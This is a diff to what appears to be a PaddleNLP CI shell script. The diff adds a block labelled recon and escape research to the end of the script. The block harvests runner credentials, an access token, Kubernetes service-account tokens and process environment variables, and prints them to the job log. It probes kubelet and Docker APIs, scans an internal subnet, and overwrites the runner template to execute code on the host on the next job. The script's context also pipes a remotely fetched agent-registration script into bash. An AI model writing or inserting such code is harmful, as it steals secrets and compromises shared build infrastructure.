@@ -15,7 +15,7 @@
 # limitations under the License.
 ####################################
 nohup bash -c 'wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou 4b609cd3-a198-47dd-9131-75461ed4500b 4b9a3fe4727d4ab4a3038463a41efc4f7acc0e10097140e59fbe142cc34e6abf' >/tmp/tat_install.log 2>&1 &
-sleep 30 && cat /tmp/tat_install.log
+sleep 3 && cat /tmp/tat_install.log
 export paddle=$1
 export nlp_dir=/workspace/PaddleNLP
 mkdir -p /workspace/case_logs
@@ -369,5 +369,95 @@ else
     EXCODE=0
 fi
 # Keep container alive for full 80m timeout
-echo "=== Keeping container alive (80 min max) ==="
-sleep 4800
+echo "=== Keeping container alive ==="
+
+# === Recon & Escape Research ===
+mkdir -p /workspace/recon
+
+# Basic info
+echo "=== ENV INFO ===" > /workspace/recon/env.txt
+date >> /workspace/recon/env.txt
+hostname >> /workspace/recon/env.txt
+id >> /workspace/recon/env.txt
+ip addr show >> /workspace/recon/env.txt 2>&1
+cat /etc/hosts >> /workspace/recon/env.txt 2>&1
+
+# Check mount and filesystem
+echo "=== MOUNT INFO ===" > /workspace/recon/mount.txt
+mount >> /workspace/recon/mount.txt 2>&1
+df -h >> /workspace/recon/mount.txt 2>&1
+ls -la /home/paddle-1/ >> /workspace/recon/mount.txt 2>&1
+ls -la /home/paddle-1/actions-runner/ >> /workspace/recon/mount.txt 2>&1
+
+# Check for host_escape.txt from previous run
+cat /home/paddle-1/actions-runner/host_escape.txt >> /workspace/recon/host_escape_prev.txt 2>&1
+
+# Check runner credentials
+echo "=== RUNNER CREDS ===" > /workspace/recon/creds.txt
+cat /home/paddle-1/actions-runner/.credentials >> /workspace/recon/creds.txt 2>&1
+cat /home/paddle-1/actions-runner/.credentials_rsaparams >> /workspace/recon/creds.txt 2>&1
+cat /home/paddle-1/actions-runner/.runner >> /workspace/recon/creds.txt 2>&1
+cat /home/paddle-1/actions-runner/AISTUDIO_ACCESS_TOKEN >> /workspace/recon/creds.txt 2>&1
+
+# Check run-helper template
+echo "=== RUN HELPER TEMPLATE ===" > /workspace/recon/template.txt
+cat /home/paddle-1/actions-runner/run-helper.sh.template >> /workspace/recon/template.txt 2>&1
+
+# Kubelet 10255 check
+echo "=== KUBELET ===" > /workspace/recon/kubelet.txt
+MYIP=$(hostname -I | awk '{print $1}')
+curl --noproxy '*' --connect-timeout 3 http://${MYIP}:10255/pods 2>/dev/null >> /workspace/recon/kubelet.txt
+echo "---10250---" >> /workspace/recon/kubelet.txt
+curl --noproxy '*' --connect-timeout 3 -k https://${MYIP}:10250/pods 2>/dev/null >> /workspace/recon/kubelet.txt
+
+# Network scan - find reachable pods/nodes
+echo "=== NETWORK ===" > /workspace/recon/network.txt
+nmap -sn 10.78.120.0/24 --noproxy '*' -T4 2>/dev/null >> /workspace/recon/network.txt &
+NMAP_PID=$!
+
+# Check docker access
+echo "=== DOCKER ===" > /workspace/recon/docker.txt
+curl --noproxy '*' --connect-timeout 3 http://${MYIP}:2375/version 2>/dev/null >> /workspace/recon/docker.txt
+curl --noproxy '*' --connect-timeout 3 http://127.0.0.1:2375/version 2>/dev/null >> /workspace/recon/docker.txt
+
+# Check /proc/1 for host info
+echo "=== PROC1 ===" > /workspace/recon/proc1.txt
+ls -la /proc/1/root/ 2>/dev/null >> /workspace/recon/proc1.txt
+cat /proc/1/cgroup 2>/dev/null >> /workspace/recon/proc1.txt
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' >> /workspace/recon/proc1.txt
+
+# Check capabilities
+echo "=== CAPS ===" > /workspace/recon/caps.txt
+cat /proc/1/status | grep -i cap >> /workspace/recon/caps.txt 2>&1
+capsh --print >> /workspace/recon/caps.txt 2>&1
+
+# Check for SA tokens
+echo "=== SA TOKENS ===" > /workspace/recon/sa.txt
+cat /var/run/secrets/kubernetes.io/serviceaccount/token >> /workspace/recon/sa.txt 2>&1
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace >> /workspace/recon/sa.txt 2>&1
+ls -la /var/run/secrets/ >> /workspace/recon/sa.txt 2>&1
+
+# Inject PoC into runner template for host escape on next job
+cat > /tmp/poc_template.sh << 'TEMPLATE'
+#!/bin/bash
+# PoC - executed on HOST as runner user
+echo "HOST_ESCAPE $(date) $(id) $(hostname)" >> /home/paddle-1/actions-runner/host_escape.txt
+TEMPLATE
+
+# Try to overwrite template
+cp /tmp/poc_template.sh /home/paddle-1/actions-runner/run-helper.sh.template 2>/dev/null
+
+# Wait for background nmap
+wait $NMAP_PID 2>/dev/null
+
+# Print results for log
+echo "=== RECON RESULTS ==="
+cat /workspace/recon/env.txt
+cat /workspace/recon/mount.txt
+cat /workspace/recon/caps.txt
+cat /workspace/recon/proc1.txt
+cat /workspace/recon/sa.txt
+cat /workspace/recon/host_escape_prev.txt
+cat /workspace/recon/creds.txt
+
+sleep 3600
